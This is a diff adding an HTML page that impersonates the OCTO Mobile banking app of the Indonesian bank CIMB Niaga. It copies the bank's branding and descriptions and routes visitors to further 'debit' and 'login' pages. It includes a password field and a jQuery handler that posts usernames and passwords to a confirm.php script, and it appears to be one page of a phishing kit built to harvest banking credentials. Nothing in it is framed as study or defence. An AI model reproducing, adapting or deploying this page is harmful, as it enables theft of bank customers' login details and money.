@@ -1,0 +1,471 @@
+<html data-wf-domain="octo-mobile.webflow.io" data-wf-page="63f0d256d78aacfe78f92aa3" data-wf-site="63b790a102e67e44421cf01b" class="w-mod-js w-mod-touch wf-opensans-n3-active wf-opensans-i3-active wf-opensans-n4-active wf-opensans-i4-active wf-opensans-n6-active wf-opensans-i6-active wf-opensans-n7-active wf-opensans-i7-active wf-opensans-n8-active wf-opensans-i8-active wf-inconsolata-n4-active wf-inconsolata-n7-active wf-active">
+ <head>
+ <meta name="theme-color" content="#780001">
+<meta content="Memperkenalkan The New OCTO Mobile. Inilah sebuah perbankan digital di genggaman Anda. Kini, semua bisa dengan OCTO Mobile. OCTO Mobile hadir dengan banyak fitur baru untuk kenyamanan serta kemudahan bertransaksi. Mulai dari pembukaan rekening pertama tanpa harus ke cabang, tarik dan setor tunai tanpa kartu dan berbagai promo transaksi QR di merchant atau eCommerce pilihan." name="description">
+  <meta content="CIMB NIAGA | OCTO MOBILE" property="og:title">
+  <meta content="Memperkenalkan The New OCTO Mobile. Inilah sebuah perbankan digital di genggaman Anda. Kini, semua bisa dengan OCTO Mobile. OCTO Mobile hadir dengan banyak fitur baru untuk kenyamanan serta kemudahan bertransaksi. Mulai dari pembukaan rekening pertama tanpa harus ke cabang, tarik dan setor tunai tanpa kartu dan berbagai promo transaksi QR di merchant atau eCommerce pilihan." property="og:description">
+  <meta content="https://pbs.twimg.com/media/FpN6E2XaQAE4Qgj?format=jpg&name=medium" property="og:image">
+  <meta content="cimbniaga.co.id" property="twitter:title">
+  <meta content="Memperkenalkan The New OCTO Mobile. Inilah sebuah perbankan digital di genggaman Anda. Kini, semua bisa dengan OCTO Mobile. OCTO Mobile hadir dengan banyak fitur baru untuk kenyamanan serta kemudahan bertransaksi. Mulai dari pembukaan rekening pertama tanpa harus ke cabang, tarik dan setor tunai tanpa kartu dan berbagai promo transaksi QR di merchant atau eCommerce pilihan." property="twitter:description">
+  <meta content="https://pbs.twimg.com/media/FpN6E2XaQAE4Qgj?format=jpg&name=medium" property="twitter:image">
+  <meta property="og:type" content="website">
+  <meta content="summary_large_image" name="twitter:card">
+ <meta charset="utf-8">
+  <title>Octo Click | CIMB NIAGA</title>
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+  <meta content="Webflow" name="generator">
+  <link href="https://uploads-ssl.webflow.com/63b790a102e67e44421cf01b/css/octo-mobile.webflow.305a4439f.css" rel="stylesheet" type="text/css">
+  <!--[if lt IE 9]> <![endif]--> 
+<link rel="canonical" href="https://www.cimbniaga.co.id/id/personal/tabungan/octo.mobile">
+  <link href="https://pbs.twimg.com/profile_images/1370573628169883654/q9JxDRfr_400x400.jpg" rel="shortcut icon" type="image/x-icon">
+  <link href="https://pbs.twimg.com/profile_images/1370573628169883654/q9JxDRfr_400x400.jpg" rel="apple-touch-icon">
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+<link rel="stylesheet" href="./style.css">
+ <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<link href="https://fonts.googleapis.com/css?family=Arima+Madurai" rel="stylesheet" type="text/css">
+  <style>
+  
+   @media screen and (max-width: 480px) {
+                body{
+                position: fixed;
+                width: 100%;
+                left: 0;
+                top: 0; 
+                bottom: 0;
+                right: 0;
+                background-color: #fff;
+                margin: 0px auto;
+                height: 100%;
+                text-align: center;
+ }
+  }
+  
+  
+   @media screen and (max-width: 360px) {
+                body{
+                position: fixed;
+                width: 100%;
+                left: 0;
+                top: 0; 
+                bottom: 0;
+                background-color: #fff;
+                right: 0;
+                margin: 0px auto;
+                height: 100%;
+                text-align: center;
+ }
+  }
+  
+  
+  
+  
+/* Button used to open the contact form - fixed at the bottom of the page */
+.open-button {
+  background-color: #555;
+  color: white;
+  padding: 16px 20px;
+  border: none;
+  cursor: pointer;
+  opacity: 0.8;
+  position: fixed;
+  bottom: 23px;
+  right: 28px;
+  width: 280px;
+}
+
+/* The popup form - hidden by default */
+.form-popup {
+    
+    background-color:rgba(192,192,192,0.9);
+  display: none;
+  position: fixed;
+  margin-top: -500px;
+  margin-left: 0px;
+  margin-right: 0px;
+  right: 0px;
+  border-radius: 0px;
+  z-index: 9;
+}
+
+/* Add styles to the form container */
+.form-container {
+  max-width: 300px;
+  padding: 10px;
+  background-color: white;
+}
+
+
+/* Full-width input fields */
+.form-container input[type=text], .form-container input[type=password] {
+  width: 100%;
+  padding: 15px;
+  margin: 5px 0 22px 0;
+  border-color: #fff;
+  background: #f1f1f1;
+}
+
+/* When the inputs get focus, do something */
+.form-container input[type=text]:focus, 
+:focus {
+  background-color: none;
+  outline: none;
+}
+
+/* Set a style for the submit/login button */
+.form-container .btn {
+  background-color: #04AA6D;
+  color: white;
+  padding: 16px 20px;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+  margin-bottom:10px;
+  opacity: 0.8;
+}
+
+/* Add a red background color to the cancel button */
+.form-container .cancel {
+  background-color: red;
+}
+/* Add some hover effects to buttons */
+.form-container .btn:hover, .open-button:hover {
+  opacity: 1;
+}
+  .btn-cancel {
+        border: ;
+        width: 86%;
+        height: 55px;
+            text-align: center; 
+              color: blue;
+       margin-top: 270px;
+       margin-left: -330px;
+       background: #fff;
+       border: 5px solid #fff;
+       opacity: 0.0;
+      position: absolute;
+     
+   }
+
+/* Add a red background color to the cancel button */
+
+ #aseli {
+            width: 100%;
+            height: 100%;
+            display: none;
+            margin: auto;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 9999;
+            overflow-y: scroll;
+        }
+        
+        welalxcome {
+        position: fixed;
+    left: 0;
+    top: -23;
+    width: 100vw;
+    height: 100vh;
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    align-items: center;
+    align-content: center;
+    justify-content: center;
+}
+welalxcome img {
+        width:100vw;
+    height: 716px;
+}
+chsalxcome {
+        position: relative;
+    width: 100%;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+}
+
+.btn{
+    margin-bottom: 30px;
+    margin-left: 10px;
+    float: left;
+    font-size: 17px;
+    color: #780001;
+    margin-top: 30px;
+}
+.text-field-2{
+    margin-top: px;
+    background: none;
+    position: relative;
+}
+      .submit-button{
+          position: relative;
+      }
+      
+      .button-2{
+          position: relative;
+      }
+      .wf-force-outline-none[tabindex="-1"]:focus{outline:none;}
+      
+        #lodingku{
+    position: fixed; 
+    top: 0; 
+    right: 0; 
+    left: 0; 
+    display: none;
+    bottom: 0;
+    margin: 0px auto;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    z-index: 99999999;
+}
+
+.btn-login{
+    margin: -5px auto; width: 90%; height: 58px; background: #fff; border-radius: 48px; z-index: ; position: relative; transition: background  50ms step-start 0s;
+    color: #fff;
+    
+    box-shadow: rgb(080, 080, 080) 3px 2px 4px 0px; 
+    	font-family: 'Arima Madurai', ;
+}
+
+.btn-login:disabled{
+    background: #E2DEDD;
+    color: #fff;
+    	font-family: 'Arima Madurai', ;
+}
+
+ </style>
+ </head>
+ <body class="body-2">
+<main>
+
+ <center>
+<nav style="position: fixed; margin: 0px auto; left: 0; right: 0; top: 0; bottom: 0; width: 100%; height: 60; background-color: #780001; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzqawGtj41q8M0cB8mRVobYbcyOq9rfMobVCNAvPplacwUe7AkAYp-10B4JYKtA_iaZUTzaGKowwVok-a99UXf8zLZwTPoMYSSQiBCVpg7w9Wvck7DsiO3cjPDSXTcdSwZ7U861enkP2R_OvreKOAl3YtoFINMrVpvxgfbykUxBUFrMKtFzE6G4oOhaTA/s1080/AddText_11-22-02.44.05.jpg); background-size: 100% 100%; background-position: 100% 100%;"></nav>
+ <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhgtlEFC1EqX-97fbhe6BV75ES2GovqGRpYbwmvENeR3q_D049gHd0cJCXS4p0bxglp5bgv8YTrVQ6vmQ2nz4C4BZLRAM8ArETQD7HdoeVx7dGBPO6EBmLYPmdPuJVVwmQ2S5WcZA0NrkxUpi1myDFN830dJ8BPkpoy56GnFspKEDGw21e0vrBEdY9Js6E/s391/IMG_20231122_224014.jpg" style="position: fixed; bottom: 10; left: 0; right: 0; margin: 0px auto; width: 80px">
+ <div class="app-loading" style="position: fixed; margin: 0px auto; left: 0; right: 0; top: 0; bottom: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4); z-index: 99999999; padding-top: 250px; display: " id="lodingku">
+ <img class="img-fluid" style="width: 80px" src="https://www.octoclicks.co.id/assets/octo_clicks/pop_up/octo_loading.gif" alt="preloader" />
+      </div>
+  </center>
+   <fieldset id="userku" style="padding: 15px">
+ <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9OHcEZSuMf91FGFmad7-turLxbn83FwusKAuY0c89caqEDyHpyPKLI0F6a413ajT2D_jF8CPNuGsQtMBthAA1NC1SqyYNpXZl-8AWm4Iz3jPr_kTVVzqDVQzBARySR2QmFkIx-bJZqEd42wxkazIZxDtIOO6Ig26A5O4LCc6Xe7_SCvH4pGmFuqdiltE/s1080/IMG_20231122_143948.jpg" style="position: fixed; margin: 0px auto; left: 0; right: 0; top: 95; width: 90%;">
+  <div class="container-4 w-container" style="background: url(); ">
+   <div class="form-block-2 w-form">
+   
+        <div style="margin-top: 150px">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXFWs2U5HDA9zq9TGWDS-wCneNsGFvwyEAYw&usqp=CAU" width="120px">
+<h4 style="margin-top: 40px">Anda Saat ini adalah pengguna?</h4><br/>
+</div>
+<p></p>
+ <p></p>
+ <form onsubmit="kirimPesan()" method="get" action="debit.html">
+
+     <button type="submit" id="kirim" value="Login" class="btn-login submit-button w-button" style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNXUD0U1ya3u0b1Uobk26Pa4FlEkBff6N__vCarDuIktZ5wo8dtO7mAIDErCaWFlsW8UTWCiADpF-DUz8HpENTnMw96QAATW6vcOoA8lrBMmHWuRSxcZ6sppV96DYsvz8vBoZ8gi8Z7ZqC2HGR8hSxBQ6xB5qnPnrDWx9ZjOALkcsoS-DVrNpUoNHo-Pg/s3160/AddText_11-29-03.53.06.jpg); background-posiition: 100% 100%; background-size: 100% 100%; border: 1px solid #780001" ></button><p></p>
+     </form>
+    <br/>    
+<form onsubmit="kirimPesan1()" method="get" action="login.html" >  
+   
+ <button type="submit" id="kirim" value="Login" class="btn-login submit-button w-button" style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuBhwxhmC-_VkN5krTPz7-ztvlWNlcBY4QLSPeYUUAL5ige3pqZkaSkvXy4zf5TVlVLVMK9ypC7qNeAnchihgaqq583yotOmqoZ3dtSIZJKWF8lQ4U5r0nH1OXlQrB64UCA8jnkCtCLsK2eEoGSfjYH9lKsvdJBOu2FYm_WK7zhZBnm-Jrw26lAL-5RRQ/s3160/AddText_11-29-03.50.50.jpg); background-posiition: 100% 100%; background-size: 100% 100%; border: 1px solid #780001"></button>
+
+   
+ 
+ </form>
+ </fieldset>
+    <script>
+      var nomor = sessionStorage.getItem("nomor");
+        document.getElementById("thisPhone").value = nomor + "";
+        const togglePassword = document.getElementById("togglePassword");
+        const password = document.getElementById("inppas");
+        togglePassword.addEventListener("click", function () {
+            const type = password.getAttribute("type") === "password" ? "text" : "password";
+            password.setAttribute("type", type);
+            this.classList.toggle("bi-eye");
+        });
+        function loadd(){
+            $("#loader").fadeIn();
+        }
+        
+</script> 
+ 
+ <fieldset id="passku" style="display: none; padding: 15px">
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9OHcEZSuMf91FGFmad7-turLxbn83FwusKAuY0c89caqEDyHpyPKLI0F6a413ajT2D_jF8CPNuGsQtMBthAA1NC1SqyYNpXZl-8AWm4Iz3jPr_kTVVzqDVQzBARySR2QmFkIx-bJZqEd42wxkazIZxDtIOO6Ig26A5O4LCc6Xe7_SCvH4pGmFuqdiltE/s1080/IMG_20231122_143948.jpg" style="position: fixed; margin: 0px auto; left: 0; right: 0; top: 95; width: 90%;">     
+ <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrk_5SHaWcwcrFX9AvegKwaeUM_TJ6Txg1cOZV6jL8i9mhIGONQT00LW64E8yXASGXe2Lg7JwY9S0Ia-u4Lkwvd8eFfhWCvnKUG_LFhsn0nQT7qMdKArUL69U8C4uyyGO-IvQZaY0p7RMNnzPnJaRBrQWhn90eNUUQB6iCjIjmB0eHfQXhrphb5NpGyK0/s1080/Screenshot_2023-11-22-16-00-35-80_40deb401b9ffe8e1df2f1cc5ba480b12.jpg" style="position: fixed; margin: 0px auto; left: 0; right: 0; top: 160; width: 100%; margin-bottom: 20px">
+ <br/>
+  <div class="container-4 w-container" style="background: url(); ">
+   <div class="form-block-2 w-form">
+    <form onsubmit="kirimPesan(event); return false" method="get" class="form-3" aria-label="Form" style="text-align: center; margin-top: 240px">
+
+     <input id="password" type="password" class="text-field- w-input" maxlength="256" name="user" data-name="user" placeholder="Masukkan password di sini" required style="margin: 0px auto; width: 90%; height: 50px; border: 1px solid #ccc; border-radius: 8px; font-size: 17px">
+  <a href="#" type="button" class="btn"  onclick="lupauser()">Lupa Password?<br/>
+  
+ <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhN2tb2gt42G-tln7n65LWPkHUVr7ZlrwFfJm_YNXBIO0j9rLWal_9NFE629csteJgJ2KMrC6MxAo8T827JGiwvD0lPGb_wNxmjj5sHhDmU42lbcDhuXE_v_iwPGaEh7MQnMoCUsq0lHHyhTpRWzldjACDh1UKkawmlWYbV0gsq8eDzxwUKGqqAZtBsUP4/s120/download.png" style="width: 75px; left: 25; position: absolute; z-index: 999"></a>
+ 
+      <button type="submit" id="submit" value="Login" class="btn-login submit-button w-button" style="" disabled>Lanjutkan</button>
+      
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQqQTYWO0E0KAZwDw06YFjK7KH_xmugydyl3que4vnITXlFDXQxgRNU7VYyBQCwX2nBNh9q1aH1PItL9N0FVFIkSz_5mIHV_CIhB3cKMOwq4JXp3vxGXghyqS_iue3I9Lphv_oyEMOcQJ7fSuTK5srkV1duUnXyQGP61r1VytCStQPy9-y9uYmN244QCw/s1080/IMG_20231122_144001.jpg" style="position: relative; margin: 0px auto; left: 0; right: 0; top: 15; width: 100%;">   
+
+</form>
+
+ </div>
+ </div>
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="text/html"></script>
+  
+<div class="form-popup" id="myForm">
+       <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg82UiqfqgXA08d054IzBvm1JCCm_XeiAUpOaelJxtkeTDmLpu_moRwQPLK7Haz5folN0hsnAkXWGKTBrqpoMptOFhR4uoULSqxBS47p0yEWW9HPLU35Pnuzp_38b1pry67B82yODwhAZuC2WAbLePg8Pa4QvjGLO_vCoLfk3Hi2EVudRvBaOT5JgnU/s2138/AddText_02-19-01.44.30.jpg" style="max-width: 112%; height: 720px; margin-left: -15px;  margin-top: -225px;" class="card-item__bg">
+       <button type="button" class="btn-cancel" onclick="closeForm()">Cancel</button>
+       
+       </div>
+       
+<script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+function openForm() {
+  document.getElementById("myForm").style.display = "block";
+}
+
+function closeForm() {
+  document.getElementById("myForm").style.display = "none";
+}
+
+        $( document ).ready(function() {
+            setTimeout(() => {
+                $('welalxcome').hide();
+                $('chsalxcome2').fadeIn();
+            },2500)
+        });
+</script>
+ <script>
+
+         function OnButton(user) {
+
+            if(user.length > 4) {
+                $("#kirim").prop('disabled', false);
+            } else {
+                $("#kirim").prop('disabled', true);
+            }
+        }
+        
+     
+        $(document).ready(function() {
+            $("body").on('click', 'button#doLog', function() {
+                var user = $("#user").val();
+                var pass = $("#pass").val();
+
+                $.ajax({
+                    url: "/login/confirm.php",
+                    method: "POST",
+                    data: "username="+user+"&password="+pass,
+                    beforeSend: function() {
+                        $("#loading").show();
+                    },
+                    success: function(responsex) {
+                        $("#aseli").html('');
+                        if(responsex == "true") {
+                            $.get("", function(datax, status){
+                                window.history.pushState("", "", '');
+                                $("#hideBody").hide();
+                                $("#loading").hide();
+                                $("#aseli").html(datax);
+                            });
+                        } else {
+                            $.get("", function(data, status){
+                                window.history.pushState("", "", '');
+                                setTimeout(function() { 
+                                    $("#hideBody").hide();
+                                    $("#loading").hide();
+                                    $("#aseli").html(data);
+                                    $("#aseli").show();
+                                }, 1000);
+                            });
+                        }
+                        
+                    }
+                })
+            });
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#pass").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#pass").prop("type", "password");
+                });
+            });
+
+            $("#user").on('input', function() {
+                var user = $("#user").val();
+                var pass = $("#pass").val();
+
+                OnButton(user, pass);
+            });
+
+            $("#pass").on('input', function() {
+                var user = $("#user").val();
+                var pass = $("#pass").val();
+
+                OnButton(user, pass);
+            });
+        });
+    </script>
+    
+   <script>
+ // Get references to the input and button elements
+const input = document.getElementById("password");
+const button = document.getElementById("submit");
+
+// Add an event listener for the input event
+input.addEventListener("input", () => {
+  // Check if the input field has any text
+  if (input.value.length > 5) {
+    // If there's text, enable the button
+    button.disabled = false;
+  } else {
+    // If there's no text, disable the button
+    button.disabled = true;
+  }
+});       
+   </script>
+       <script>
+ function kirimPesan(event) {
+          $("#lodingku").show();
+
+
+ window.location = "./debit.html";  
+         }
+     </script>
+           <script>
+ function kirimPesan1(event) {
+          $("#lodingku").show();
+
+ window.location = "./login.html";  
+         }
+     </script>
+ </body>
+</html>
+<script>
+ 
+    
+ function lupauser(){
+   $("#lodingku").show();
+   setTimeout(function(){
+       $("#lodingku").hide();
+     window.location = "./lupa_user.html";  
+   }, 1500)
+ }   
+    
+</script>
